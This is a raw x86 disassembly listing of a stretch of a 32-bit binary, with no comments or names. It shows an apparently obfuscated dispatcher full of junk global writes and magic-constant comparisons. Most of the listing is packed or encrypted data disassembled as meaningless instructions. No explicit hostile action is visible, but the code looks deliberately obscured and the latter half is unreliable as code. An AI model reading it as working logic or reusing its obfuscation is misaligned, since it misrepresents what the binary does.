  41769d:	jmp    0x417669
  4176a2:	mov    esi,DWORD PTR [ebp+0x1c]
  4176a5:	or     ebx,0xffffffff
  4176a8:	mov    DWORD PTR ds:0x426e91,0x369f
  4176b2:	cmp    eax,0x70941f8a
  4176b7:	mov    DWORD PTR ds:0x426ec9,0x473e
  4176c1:	jne    0x417702
  4176c7:	mov    DWORD PTR ds:0x426edd,0x672c
  4176d1:	cmp    esi,ebx
  4176d3:	jne    0x417702
  4176d9:	mov    DWORD PTR ds:0x426f05,0x6cc9
  4176e3:	push   ebx
  4176e4:	mov    DWORD PTR ds:0x426edd,0x7b40
  4176ee:	push   0x70941f97
  4176f3:	mov    DWORD PTR ds:0x426eb5,0xfd5
  4176fd:	jmp    0x41c1b4
  417702:	not    eax
  417704:	mov    eax,DWORD PTR [ebp+0x18]
  417707:	mov    esi,DWORD PTR [ebp+0x1c]
  41770a:	cmp    eax,0x70941f97
  41770f:	jne    0x41773c
  417715:	mov    DWORD PTR ds:0x426e9d,0x16ae
  41771f:	cmp    esi,ebx
  417721:	jne    0x41773c
  417727:	mov    DWORD PTR ds:0x426f29,0x795f
  417731:	push   ebx
  417732:	push   0x70941f94
  417737:	jmp    0x41c1b4
  41773c:	mov    eax,0x27d6
  417741:	mov    eax,DWORD PTR [ebp+0x18]
  417744:	mov    esi,DWORD PTR [ebp+0x1c]
  417747:	mov    DWORD PTR ds:0x426e89,0x6099
  417751:	cmp    eax,0x70941f94
  417756:	mov    DWORD PTR ds:0x426f25,0x7197
  417760:	jne    0x417797
  417766:	mov    DWORD PTR ds:0x426ea9,0x1c69
  417770:	cmp    esi,ebx
  417772:	mov    DWORD PTR ds:0x426e99,0x2feb
  41777c:	jne    0x417797
  417782:	push   ebx
  417783:	mov    DWORD PTR ds:0x426f05,0xf40
  41778d:	push   0x70941f91
  417792:	jmp    0x41c1b4
  417797:	mov    eax,DWORD PTR [ebp+0x18]
  41779a:	mov    esi,DWORD PTR [ebp+0x1c]
  41779d:	cmp    eax,0x70941f91
  4177a2:	mov    DWORD PTR ds:0x426ea5,0x751d
  4177ac:	jne    0x4177e3
  4177b2:	mov    DWORD PTR ds:0x426ebd,0x378d
  4177bc:	cmp    esi,ebx
  4177be:	mov    DWORD PTR ds:0x426ef9,0x65e8
  4177c8:	jne    0x4177e3
  4177ce:	push   ebx
  4177cf:	push   0x70941f9e
  4177d4:	mov    DWORD PTR ds:0x426f01,0x54ba
  4177de:	jmp    0x41c1b4
  4177e3:	movzx  eax,BYTE PTR ds:0x426ef1
  4177ea:	mov    eax,DWORD PTR [ebp+0x18]
  4177ed:	mov    esi,DWORD PTR [ebp+0x1c]
  4177f0:	mov    edi,0x70941fa5
  4177f5:	mov    DWORD PTR ds:0x426f1d,0x1da7
  4177ff:	cmp    eax,edi
  417801:	mov    DWORD PTR ds:0x426f19,0x3c14
  41780b:	jne    0x41c152
  417811:	mov    DWORD PTR ds:0x426eb5,0x795b
  41781b:	cmp    esi,ebx
  41781d:	jne    0x41c152
  417823:	sub    edi,eax
  417825:	mov    eax,DWORD PTR [ebp+0x10]
  417828:	mov    DWORD PTR ds:0x426f15,0x1d
  417832:	cmp    DWORD PTR ds:0x426f15,0x0
  417839:	je     0x41788f
  41783f:	cmp    DWORD PTR ds:0x426f15,0x8
  417846:	jle    0x41788f
  41784c:	jmp    0x417861
  417851:	push   0x426f01
  417856:	push   0x6b2f
  41785b:	call   DWORD PTR ds:0x430a48
  417861:	cmp    DWORD PTR ds:0x426f15,0x9
  417868:	jne    0x41787d
  41786e:	xor    edi,edi
  417870:	or     edi,DWORD PTR ds:0x426f15
  417876:	dec    edi
  417877:	mov    DWORD PTR ds:0x426f15,edi
  41787d:	mov    edi,DWORD PTR ds:0x426f15
  417883:	dec    edi
  417884:	mov    DWORD PTR ds:0x426f15,edi
  41788a:	jmp    0x417832
  41788f:	xor    eax,ecx
  417891:	add    eax,edx
  417893:	mov    DWORD PTR [ebp-0x20],eax
  417896:	mov    eax,DWORD PTR [ebp+0xc]
  417899:	mov    esi,DWORD PTR [ebp-0x8]
  41789c:	xor    eax,ecx
  41789e:	add    eax,edx
  4178a0:	imul   eax,DWORD PTR [esi]
  4178a3:	mov    esi,DWORD PTR [ebp+0x8]
  4178a6:	xor    esi,ecx
  4178a8:	add    esi,edx
  4178aa:	cmp    esi,eax
  4178ac:	mov    eax,DWORD PTR [ebp-0x4]
  4178af:	mov    edi,0xffcd8d06
  4178b4:	je     0x4178d3
  4178ba:	mov    esi,DWORD PTR [ebp-0x20]
  4178bd:	add    DWORD PTR [eax],esi
  4178bf:	mov    eax,DWORD PTR [ebp-0x4]
  4178c2:	mov    esi,DWORD PTR [ebp+0xc]
  4178c5:	xor    esi,ecx
  4178c7:	add    esi,edx
  4178c9:	imul   esi,DWORD PTR [eax]
  4178cc:	mov    DWORD PTR [eax],esi
  4178ce:	jmp    0x4178d8
  4178d3:	mov    esi,DWORD PTR [ebp+0x14]
  4178d6:	xor    DWORD PTR [eax],esi
  4178d8:	mov    eax,DWORD PTR [ebp-0x4]
  4178db:	mov    esi,DWORD PTR [ebp+0x10]
  4178de:	xor    esi,ecx
  4178e0:	sub    edi,esi
  4178e2:	add    DWORD PTR [eax],edi
  4178e4:	mov    eax,DWORD PTR [ebp-0x4]
  4178e7:	mov    esi,DWORD PTR [ebp-0x8]
  4178ea:	add    esi,DWORD PTR [eax]
  4178ec:	mov    DWORD PTR [ebp-0x8],esi
  4178ef:	mov    eax,DWORD PTR [ebp+0xc]
  4178f2:	mov    esi,DWORD PTR [ebp+0xc]
  4178f5:	xor    esi,ecx
  4178f7:	xor    eax,ecx
  4178f9:	lea    eax,[eax+esi*1+0x64e5f4]
  417900:	mov    esi,DWORD PTR [ebp+0xc]
  417903:	xor    esi,ecx
  417905:	add    esi,edx
  417907:	imul   eax,esi
  41790a:	mov    esi,DWORD PTR [ebp+0xc]
  41790d:	xor    esi,ecx
  41790f:	sub    esi,eax
  417911:	mov    eax,DWORD PTR [ebp-0x4]
  417914:	add    esi,edx
  417916:	cmp    DWORD PTR [eax],esi
  417918:	mov    eax,DWORD PTR [ebp-0x4]
  41791b:	mov    esi,DWORD PTR [ebp+0x10]
  41791e:	jg     0x417934
  417924:	xor    esi,ecx
  417926:	mov    edi,0xffcd8d06
  41792b:	sub    edi,esi
  41792d:	add    DWORD PTR [eax],edi
  41792f:	jmp    0x41793a
  417934:	xor    esi,ecx
  417936:	add    esi,edx
  417938:	add    DWORD PTR [eax],esi
  41793a:	mov    eax,DWORD PTR [ebp-0x8]
  41793d:	mov    esi,DWORD PTR [ebp-0x10]
  417940:	mov    eax,DWORD PTR [eax]
  417942:	xor    esi,ecx
  417944:	add    esi,0x3272f9
  41794a:	mov    DWORD PTR [ebp-0x28],0x7097b85d
  417951:	mov    DWORD PTR [ebp-0x24],ebx
  417954:	not    esi
  417956:	mov    DWORD PTR [ebp-0x30],0x7097a55f
  41795d:	mov    DWORD PTR [ebp-0x2c],ebx
  417960:	jmp    0x419cec
  417965:	mov    bh,0xd2
  417967:	jae    0x417925
  417969:	jbe    0x4179c7
  41796b:	cmp    al,bh
  41796d:	add    BYTE PTR [edx],dl
  41796f:	sti    
  417970:	or     cl,bl
  417972:	sub    al,0xa7
  417974:	inc    esi
  417975:	test   BYTE PTR [eax-0x63178486],bh
  41797b:	jnp    0x4179f8
  41797d:	xor    eax,0x4f2a2551
  417982:	and    BYTE PTR [ebx+ebx*4],ah
  417985:	sub    bl,bl
  417987:	mov    ch,0x6d
  417989:	mov    al,0x38
  41798b:	dec    ebx
  41798c:	dec    esp
  41798d:	sbb    BYTE PTR [eax+0x3450df59],0x5f
  417994:	or     eax,0xf6153491
  417999:	pop    esi
  41799a:	xor    esi,DWORD PTR ss:[edx+0x18bf3a7e]
  4179a1:	jb     0x417963
  4179a3:	fiadd  WORD PTR [ecx+0x40eaaf86]
  4179a9:	sbb    BYTE PTR [ebx-0x38],al
  4179ac:	test   ebx,esp
  4179ae:	adc    dl,BYTE PTR [eax]
  4179b0:	shr    DWORD PTR [edx-0x28],0xda
  4179b4:	rcl    esi,1
  4179b6:	inc    ebx
  4179b7:	shr    ebp,1
  4179b9:	mov    DWORD PTR [ebp+0x5b7067b4],edx
  4179bf:	call   0xecba6406
  4179c4:	push   esp
  4179c5:	rcl    ebp,0x8c
  4179c8:	pop    edx
  4179c9:	(bad)  
  4179ca:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179cc:	lock daa 
  4179ce:	lock xlat BYTE PTR ds:[ebx]
  4179d0:	xchg   edi,eax
  4179d1:	and    dl,BYTE PTR [esi+0x7d]
  4179d4:	jnp    0x41798a
  4179d6:	mov    ebx,0xcbcf13e3
  4179db:	inc    ebx
  4179dc:	mov    eax,ds:0xd05d055e
  4179e1:	sahf   
  4179e2:	hlt    
  4179e3:	ror    DWORD PTR [eax+0xf],cl
  4179e6:	adc    al,0x10
  4179e8:	push   ds
  4179e9:	push   0x9d251d30
  4179ee:	je     0x417a68
  4179f0:	mov    ecx,0x23694c35
  4179f5:	fldcw  WORD PTR [esi]
  4179f7:	iret   
  4179f8:	push   edi
  4179f9:	mov    dh,0x64
  4179fb:	(bad)  
  4179fc:	push   ss
  4179fd:	fucomp st(5)
  4179ff:	popa   
  417a00:	add    eax,0x261e592c
  417a05:	pop    es
  417a06:	es rcl bh,1
  417a09:	popa   
  417a0a:	and    bl,BYTE PTR [ecx]
  417a0c:	and    eax,0x7cfa0108
  417a11:	pop    ebx
  417a12:	and    ebx,DWORD PTR [esi+0xf]
  417a15:	inc    eax
  417a16:	jge    0x417a4f
  417a18:	nop
  417a19:	pop    ds
  417a1a:	mov    ds:0xd0f4cdb,eax
  417a1f:	jge    0x4179e5
  417a21:	leave  
  417a22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a23:	sub    eax,0xd56beea1
  417a28:	loopne 0x4179d8
  417a2a:	out    dx,eax
  417a2b:	dec    esi
  417a2c:	shr    DWORD PTR [eax-0x520cc7ff],cl
  417a32:	test   eax,0x66b27d11
  417a37:	retf   
  417a38:	clc    
  417a39:	ja     0x4179c9
  417a3b:	xchg   ebp,eax
  417a3c:	push   esi
  417a3d:	inc    ecx
  417a3e:	xor    DWORD PTR [ecx+0x3f6a78ca],edi
  417a44:	cwde   
  417a45:	fxch   st(3)
  417a47:	pop    esi
  417a48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a49:	xchg   esi,eax
  417a4a:	retf   
  417a4b:	mov    esp,0x5c070b73
  417a50:	push   ds
  417a51:	jle    0x417aa9
  417a53:	inc    eax
  417a54:	push   0x7c6d69db
  417a59:	ja     0x417a16
  417a5b:	imul   DWORD PTR [edi-0x21359274]
  417a61:	mov    al,ds:0x208139fe
  417a66:	aaa    
  417a67:	rep lods al,BYTE PTR ds:[esi]
  417a69:	es jbe 0x417a88
  417a6c:	out    dx,eax
  417a6d:	add    DWORD PTR [edi],ebx
  417a6f:	dec    ecx
  417a70:	jno    0x417a64
  417a72:	imul   ecx,DWORD PTR [edi+0xec77211],0x64a0b4d
  417a7c:	or     ebp,DWORD PTR [eax-0x46]
  417a7f:	and    esp,DWORD PTR [eax+esi*2+0x29b45dea]
  417a86:	fnstsw WORD PTR ds:0xb951222
  417a8c:	ret    
  417a8d:	lock fld TBYTE PTR [edi+0x3cfacd72]
  417a94:	test   BYTE PTR [ecx-0x3d],0xb0
  417a98:	dec    ebx
  417a99:	aas    
  417a9a:	sbb    al,0xe8
  417a9c:	xchg   esi,eax
  417a9d:	int3   
  417a9e:	fisub  WORD PTR [esi-0x58]
  417aa1:	(bad)  
  417aa2:	jle    0x417a7a
  417aa4:	ins    BYTE PTR es:[edi],dx
  417aa5:	call   0x1887:0xb84ae3b7
  417aac:	pop    ebp
  417aad:	jne    0x417a79
  417aaf:	test   DWORD PTR [eax],0xbe1beacf
  417ab5:	or     bh,cl
  417ab7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ab8:	in     eax,0xa1
  417aba:	loope  0x417a6e
  417abc:	jno    0x417aa0
  417abe:	add    eax,0x8c58ff4b
  417ac3:	jae    0x417a82
  417ac5:	lods   eax,DWORD PTR ds:[esi]
  417ac6:	(bad)  
  417ac7:	mov    dh,0xa
  417ac9:	jecxz  0x417b44
  417acb:	push   eax
  417acc:	adc    edi,DWORD PTR cs:[ebp+0x37]
  417ad0:	int3   
  417ad1:	js     0x417a81
  417ad3:	inc    ecx
  417ad4:	xor    DWORD PTR [ebx-0x7b6d04bf],0x45eb7abf
  417ade:	cmp    bh,BYTE PTR [edx+0x3ed2323f]
  417ae4:	scas   al,BYTE PTR es:[edi]
  417ae5:	sbb    ch,dh
  417ae7:	mov    dl,0x3
  417ae9:	hlt    
  417aea:	minps  xmm3,XMMWORD PTR [ebp+0x7509072a]
  417af1:	mov    ?,WORD PTR [edi+0x29]
  417af4:	cmp    ebp,DWORD PTR [esi]
  417af6:	outs   dx,DWORD PTR ds:[esi]
  417af7:	call   0x23f5e72f
  417afc:	in     al,0xeb
  417afe:	ja     0x417b10
  417b00:	enter  0x5378,0x2a
  417b04:	out    0x99,al
  417b06:	int    0x6f
  417b08:	mov    ds:0x93b3fa1c,al
  417b0d:	sahf   
  417b0e:	sti    
  417b0f:	add    al,0x39
  417b11:	jg     0x417a94
  417b13:	add    al,0x89
  417b15:	add    ah,BYTE PTR [ecx-0x2b]
  417b18:	push   ebx
  417b19:	sahf   
  417b1a:	ret    
  417b1b:	and    eax,0xcce9549
  417b20:	rcr    BYTE PTR [esi-0x32427a16],0x9f
  417b27:	push   esi
  417b28:	inc    ecx
  417b29:	lahf   
  417b2a:	jmp    0xca38c8d5
  417b2f:	pop    esp
  417b30:	call   0x7a47:0xdd003d88
  417b37:	add    al,0xc3
  417b39:	pop    edx
  417b3a:	sub    al,0xd7
  417b3c:	js     0x417b91
  417b3e:	cli    
  417b3f:	dec    esp
  417b40:	imul   ebp,DWORD PTR [edi-0x21],0xffffffc3
  417b44:	ret    0x4819
  417b47:	loop   0x417ba3
  417b49:	(bad)  
  417b4b:	mov    ?,WORD PTR [esi]
  417b4d:	cmp    eax,0xb320f61
  417b52:	pushf  
  417b53:	stos   DWORD PTR es:[edi],eax
  417b54:	(bad)  
  417b55:	mov    bh,0xc
  417b57:	xor    al,0x24
  417b59:	mov    dl,0x46
  417b5b:	popa   
  417b5c:	inc    edi
  417b5d:	fcomp  QWORD PTR ds:0xf2a7dcd9
  417b63:	inc    esp
  417b64:	(bad)  
  417b65:	sahf   
  417b66:	xchg   esp,eax
  417b67:	pop    esp
  417b68:	cmp    bl,BYTE PTR [ebp-0x7423f47b]
  417b6e:	push   ebx
  417b6f:	and    ecx,0xfffffffd
  417b72:	push   ebp
  417b73:	push   ecx
  417b74:	pop    es
  417b75:	fs inc eax
  417b77:	cli    
  417b78:	dec    ebx
  417b79:	jbe    0x417be5
  417b7b:	lea    edx,[esi+ecx*4+0x23c7bf57]
  417b82:	fild   WORD PTR [esp+ebp*4]
  417b85:	push   0x9f270ac5
  417b8a:	(bad)  
  417b8b:	pop    eax
  417b8c:	cmp    cl,BYTE PTR [ecx-0x73]
  417b8f:	imul   ebx,DWORD PTR [edx+0x18],0x9fa0d94d
  417b96:	and    ah,BYTE PTR [esi-0x5349d305]
  417b9c:	dec    eax
  417b9d:	push   esp
  417b9e:	inc    ebx
  417b9f:	daa    
  417ba0:	mov    ah,0x2e
  417ba2:	rol    BYTE PTR cs:[eax],1
  417ba5:	mov    ebx,0x3c451f5d
  417baa:	out    dx,eax
  417bab:	sbb    DWORD PTR [esi+0x25],0xfdbd2f89
  417bb2:	cmp    DWORD PTR gs:[ebx],eax
  417bb5:	mov    esi,0xc1db95d
  417bba:	cmp    ebx,DWORD PTR [ecx+0x10f3c9f4]
  417bc0:	jno    0x417c17
  417bc2:	mov    edx,0x17fad3c7
  417bc7:	jbe    0x417b72
  417bc9:	cmp    BYTE PTR [esi+0x7c91ab7],0xe8
  417bd0:	pop    ebp
  417bd1:	jg     0x417b85
  417bd3:	mov    bh,0x1b
  417bd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417bd6:	dec    ebp
  417bd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417bd8:	out    dx,eax
  417bd9:	or     DWORD PTR [ebx],esi
  417bdb:	mov    DWORD PTR [eax+eiz*1-0x60],ebp
  417bdf:	cli    
  417be0:	jne    0x417c4e
  417be2:	fisttp DWORD PTR [ecx+eiz*1-0x3c]
  417be6:	or     al,0x55
  417be8:	pop    ebp
  417be9:	out    dx,eax
  417bea:	sub    eax,esi
  417bec:	push   ebx
  417bed:	sub    BYTE PTR [ecx-0x5fce99eb],0x6c
  417bf4:	cmp    ebx,esi
  417bf6:	pop    es
  417bf7:	cmp    al,0xdb
  417bf9:	aas    
  417bfa:	xlat   BYTE PTR ds:[ebx]
  417bfb:	bound  edx,QWORD PTR [edi+0x66b2d6c6]
  417c01:	inc    edx
  417c02:	pop    edi
  417c03:	popf   
  417c04:	pop    esp
  417c05:	jbe    0x417b87
  417c07:	pop    esi
  417c08:	fs js  0x417bf7
  417c0b:	pusha  
  417c0c:	xchg   edi,eax
  417c0d:	stc    
  417c0e:	add    al,0x53
  417c10:	mov    bh,0xf
  417c12:	or     ebp,ebp
  417c14:	or     BYTE PTR [ecx-0x52],bl
  417c17:	and    ecx,DWORD PTR [esi]
  417c19:	imul   ecx,DWORD PTR [eax+edi*2],0x11
  417c1d:	xchg   esi,eax
  417c1e:	dec    esp
  417c1f:	mov    dl,0x36
  417c21:	icebp  
  417c22:	popf   
  417c23:	loope  0x417bf0
  417c25:	pop    ecx
  417c26:	fimul  WORD PTR [esi-0x201eed1c]
  417c2c:	sbb    DWORD PTR [esi],edx
  417c2e:	popf   
  417c2f:	cdq    
  417c30:	sbb    esp,DWORD PTR [edx-0x36a9d0e2]
  417c36:	das    
  417c37:	imul   eax,DWORD PTR [eax-0x6a],0x51150ad3
  417c3e:	pushf  
  417c3f:	jg     0x417c1c
  417c41:	fcomip st,st(3)
  417c43:	(bad)  [eax+0x2a]
  417c46:	fisttp QWORD PTR [ebx-0x55]
  417c49:	or     BYTE PTR [ebx],ah
  417c4b:	in     al,dx
  417c4c:	add    DWORD PTR [esi-0x4550679],ebx
  417c52:	sub    DWORD PTR [ebx+0x216ce973],ebp
  417c58:	fisttp DWORD PTR gs:[edi+0x2d]
  417c5c:	rol    BYTE PTR [ebx-0xe],1
  417c5f:	push   edx
  417c60:	rcl    BYTE PTR [esi+0x5e51ad6e],1
  417c66:	lahf   
  417c67:	int    0xbb
  417c69:	xchg   esp,eax
  417c6a:	jno    0x417c91
  417c6c:	add    eax,0xf196e9c
  417c71:	ja     0x417c86
  417c73:	mov    ds:0x7466746c,eax
  417c78:	loope  0x417c9d
  417c7a:	ins    BYTE PTR es:[edi],dx
  417c7b:	shl    DWORD PTR [ecx+0x422520af],0x5f
  417c82:	xchg   ebx,eax
  417c83:	(bad)  
  417c84:	ficom  DWORD PTR [esi-0x50]
  417c87:	push   esp
  417c88:	mov    ds:0xbf735632,al
  417c8d:	lahf   
  417c8e:	adc    al,0xcf
  417c90:	or     cl,BYTE PTR [edx+0x15]
  417c93:	or     dl,BYTE PTR [edi+0x3d0cde38]
  417c99:	cmp    cl,BYTE PTR [ecx-0x63bba27e]
  417c9f:	jo     0x417c57
  417ca1:	or     edi,esi
  417ca3:	xchg   BYTE PTR [esi-0x70],dh
  417ca6:	outs   dx,DWORD PTR ds:[esi]
  417ca7:	mov    edx,0x861f03d1
  417cac:	pop    esi
  417cad:	(bad)  
  417caf:	push   eax
  417cb0:	or     ebp,DWORD PTR ds:0xb5919b4a
  417cb6:	mov    esp,0xbb12ce8c
  417cbb:	js     0x417d12
  417cbd:	cmp    eax,0x10e17c60
  417cc2:	push   ss
  417cc3:	add    al,0xb1
  417cc5:	lds    ecx,FWORD PTR [esi-0x10405f5]
  417ccb:	adc    edi,esi
  417ccd:	mov    edx,0x23a71f83
  417cd2:	ds mov ebp,0xedff1bad
  417cd8:	sbb    ebx,DWORD PTR [edx+0xa795238]
  417cde:	ins    DWORD PTR es:[edi],dx
  417cdf:	sbb    al,0xf
  417ce1:	and    cl,BYTE PTR [ebx]
  417ce3:	mov    esp,0x216b6c40
  417ce8:	add    DWORD PTR [ebx],0x40
  417ceb:	sbb    BYTE PTR [esi+0x6885c4ba],ch
  417cf1:	addr16 enter 0xf934,0x11
  417cf6:	cdq    
  417cf7:	jp     0x417d5f
  417cf9:	(bad)  
  417cfa:	push   ebx
  417cfb:	sti    
  417cfc:	aad    0x37
  417cfe:	sub    cl,BYTE PTR [ebp-0x14b70143]
  417d04:	or     DWORD PTR [edx-0x79b3b7],esi
  417d0a:	or     al,0x50
  417d0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d0d:	je     0x417d8c
  417d0f:	das    
  417d10:	pop    edi
  417d11:	je     0x417d08
  417d13:	xor    dl,BYTE PTR [ebp+0x58a14877]
  417d19:	inc    esp
  417d1a:	shl    DWORD PTR [eax+0x4d1421c0],0x18
  417d21:	sahf   
  417d22:	push   ebp
  417d23:	dec    edi
  417d24:	mov    ds:0x1b02ea4d,eax
  417d29:	add    eax,0x77393936
  417d2e:	and    BYTE PTR [edx+0x7f],ch
  417d31:	jl     0x417d44
  417d33:	repz pop ebx
  417d35:	jnp    0x417cd6
  417d37:	fadd   QWORD PTR [ebx+0x492f079a]
  417d3d:	retf   
  417d3e:	mov    bl,0x30
  417d40:	sub    eax,0xbf1d884c
  417d45:	scas   al,BYTE PTR es:[edi]
  417d46:	stos   BYTE PTR es:[edi],al
  417d47:	pusha  
  417d48:	push   es
  417d49:	jne    0x417cea
  417d4b:	pop    ds
  417d4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d4d:	dec    edi
  417d4e:	jecxz  0x417d00
  417d50:	outs   dx,BYTE PTR ds:[esi]
  417d51:	push   ebp
  417d52:	mov    WORD PTR ds:0x28eead91,gs
  417d58:	cmp    al,0x95
  417d5a:	xor    BYTE PTR [ecx-0x49],bl
  417d5d:	call   0x527f:0x6572bb37
  417d64:	mov    dh,dl
  417d66:	jp     0x417da5
  417d68:	inc    eax
  417d69:	mov    bl,0xb0
  417d6b:	rol    ch,cl
  417d6d:	xor    eax,0x3290b2c2
  417d72:	hlt    
  417d73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d74:	xchg   esp,eax
  417d75:	mov    ebp,0x84c6105e
  417d7a:	or     al,0x80
  417d7c:	dec    edi
  417d7d:	adc    bh,bh
  417d7f:	mov    esp,0x1830ef5d
  417d84:	xchg   esp,eax
  417d85:	dec    ebp
  417d86:	and    al,BYTE PTR [edx]
  417d88:	test   BYTE PTR [esi],al
  417d8a:	cmp    dh,ah
  417d8c:	imul   ebx,ebp,0x90ad63d6
  417d92:	mov    ecx,0xc18940e2
  417d97:	pop    esp
  417d98:	loopne 0x417d90
  417d9a:	pop    edi
  417d9b:	mov    cl,0x3
  417d9d:	fsubr  QWORD PTR [edi]
  417d9f:	or     al,0xab
  417da1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417da2:	inc    eax
  417da3:	lods   al,BYTE PTR ds:[esi]
  417da4:	dec    edx
  417da5:	mov    ds:0x2e4d08d5,eax
  417daa:	mov    edi,0xdd9468c2
  417daf:	push   ecx
  417db0:	dec    ecx
  417db1:	test   al,0x74
  417db3:	shr    DWORD PTR [edx],0xc4
  417db6:	fldenv [ebp-0x5940077d]
  417dbc:	dec    ebx
  417dbd:	popa   
  417dbe:	out    0x4d,al
  417dc0:	push   edi
  417dc1:	xchg   ecx,eax
  417dc2:	cli    
  417dc3:	sar    DWORD PTR [ebp+0x1cb685ef],cl
  417dc9:	dec    eax
  417dca:	ret    0xe99
  417dcd:	push   edx
  417dce:	mov    DWORD PTR [edi-0x71],eax
  417dd1:	and    ecx,DWORD PTR [ebp-0x7aa03fb7]
  417dd7:	sahf   
  417dd8:	fnstcw WORD PTR [eax-0x17]
  417ddb:	aam    0xe2
  417ddd:	adc    dh,BYTE PTR [ecx]
  417ddf:	inc    ecx
  417de0:	mov    BYTE PTR [ecx-0x53596903],0x97
  417de7:	popa   
  417de8:	dec    eax
  417de9:	loopne 0x417dea
  417deb:	inc    edi
  417dec:	inc    esp
  417ded:	sub    eax,0xe90d93e8
  417df2:	jmp    FWORD PTR [edi+0x442f7125]
  417df8:	dec    esi
  417df9:	retf   0x4ffb
  417dfc:	and    al,0xc0
  417dfe:	test   al,0x92
  417e00:	arpl   WORD PTR [ebx+edi*8],si
  417e03:	cmp    ecx,DWORD PTR [esi+0x3b8c387e]
  417e09:	stos   BYTE PTR es:[edi],al
  417e0a:	gs mov al,0x1b
  417e0d:	push   es
  417e0e:	nop
  417e0f:	xchg   BYTE PTR [edi+0x34],al
  417e12:	int3   
  417e13:	rcr    bl,0x79
  417e16:	xor    DWORD PTR [ebp+0x7],0xffffffef
  417e1a:	int    0x1e
  417e1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e1d:	loope  0x417e31
  417e1f:	push   0xffffffe9
  417e21:	clc    
  417e22:	adc    eax,0xf517111a
  417e27:	por    mm5,QWORD PTR [ebx-0x2c]
  417e2b:	sub    BYTE PTR cs:[edi-0x77],bh
  417e2f:	out    dx,eax
  417e30:	in     al,0xbe
  417e32:	leave  
  417e33:	push   edi
  417e34:	faddp  st(1),st
  417e36:	xor    eax,0x3b4c27de
  417e3b:	in     al,0x83
  417e3d:	adc    ecx,ebx
  417e3f:	adc    eax,0xb625ee65
  417e44:	cld    
  417e45:	sbb    BYTE PTR [eax-0x70],ah
  417e48:	rcr    DWORD PTR [edx-0x46c5b06b],0xb5
  417e4f:	adc    DWORD PTR [edi+0x54c00910],esp
  417e55:	mov    eax,0xd6870a54
  417e5a:	sub    al,al
  417e5c:	aad    0xc4
  417e5e:	aas    
  417e5f:	jg     0x417e52
  417e61:	dec    esi
  417e62:	arpl   WORD PTR [ecx-0x41],sp
  417e65:	bound  eax,QWORD PTR [edx+0x7d]
  417e68:	fs push ds
  417e6a:	cs jp  0x417e7f
  417e6d:	scas   al,BYTE PTR es:[edi]
  417e6e:	mov    ch,0x14
  417e70:	or     BYTE PTR [edx-0x80],bl
  417e73:	push   0xffffffae
  417e75:	xor    DWORD PTR [eax+0x491a31f1],esi
  417e7b:	ins    DWORD PTR es:[edi],dx
  417e7c:	das    
  417e7d:	add    cl,BYTE PTR [ebp-0x1152048a]
  417e83:	out    dx,al
  417e84:	and    al,0x5b
  417e86:	inc    ebx
  417e87:	nop
  417e88:	bound  ebp,QWORD PTR [ecx]
  417e8a:	cmp    BYTE PTR ds:0x705c9b9b,bl
  417e90:	xor    bh,BYTE PTR [edx-0x1f400746]
  417e96:	int    0x2e
  417e98:	daa    
  417e99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e9a:	or     al,0xd7
  417e9c:	in     eax,dx
  417e9d:	ret    0xb424
  417ea0:	test   al,0xbc
  417ea2:	mov    esi,0x40bf5a5a
  417ea7:	sub    DWORD PTR [bp+si],ebx
  417eaa:	aam    0xc1
  417eac:	cmp    ecx,ebx
  417eae:	mov    dh,0x1b
  417eb0:	out    dx,eax
  417eb1:	arpl   WORD PTR [eax-0x10],bx
  417eb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417eb5:	addr16 jmp 0x417e7a
  417eb8:	dec    ecx
  417eb9:	and    DWORD PTR [esi+0x57],eax
  417ebc:	aam    0x44
  417ebe:	(bad)  [edi-0x4d]
  417ec1:	sbb    edi,ebp
  417ec3:	bound  edx,QWORD PTR [eax+0x5ff2c928]
  417ec9:	push   eax
  417eca:	jp     0x417e7d
  417ecc:	(bad)  
  417ece:	pushf  
  417ecf:	scas   eax,DWORD PTR es:[edi]
  417ed0:	and    dh,BYTE PTR [esi]
  417ed2:	xchg   edi,eax
  417ed3:	xor    al,0x3a
  417ed5:	lea    ebp,[ecx+0x51]
  417ed8:	pusha  
  417ed9:	mov    al,ds:0x29c31722
  417ede:	int3   
  417edf:	push   ss
  417ee0:	xchg   edx,eax
  417ee1:	ds sbb al,0x69
  417ee4:	jne    0x417e7c
  417ee6:	lods   eax,DWORD PTR ds:[esi]
  417ee7:	mov    ah,0xa5
  417ee9:	xor    al,0x54
  417eeb:	mov    dh,0x1d
  417eed:	iret   
  417eee:	retf   
  417eef:	jmp    0xff89:0x1826153f
  417ef6:	xchg   ebx,eax
  417ef7:	cmp    bh,dl
  417ef9:	mov    bl,BYTE PTR [ecx]
  417efb:	push   ecx
  417efc:	aaa    
  417efd:	adc    esi,DWORD PTR [ebx]
  417eff:	sub    eax,0xe81e9cc0
  417f04:	jg     0x417f2c
  417f06:	sub    BYTE PTR [ebx],bh
  417f08:	add    DWORD PTR [ecx-0x58],esi
  417f0b:	test   BYTE PTR [edx-0x3],dh
  417f0e:	in     al,dx
  417f0f:	jne    0x417f6a
  417f11:	sti    
  417f12:	xlat   BYTE PTR ds:[ebx]
  417f13:	adc    al,0x69
  417f15:	(bad)  
  417f16:	outs   dx,BYTE PTR ds:[esi]
  417f17:	push   eax
  417f18:	sub    DWORD PTR [ebx+0x183783dc],esi
  417f1e:	ins    DWORD PTR es:[edi],dx
  417f1f:	xchg   ch,dl
  417f21:	sub    al,bh
  417f23:	jmp    0x605fdacd
  417f28:	jmp    0x65fd:0x8b26d90a
  417f2f:	and    ebp,DWORD PTR [ebx-0x7a]
  417f32:	(bad)  
  417f34:	mov    ch,0xea
  417f36:	or     dl,cl
  417f38:	dec    esp
  417f39:	jo     0x417f6b
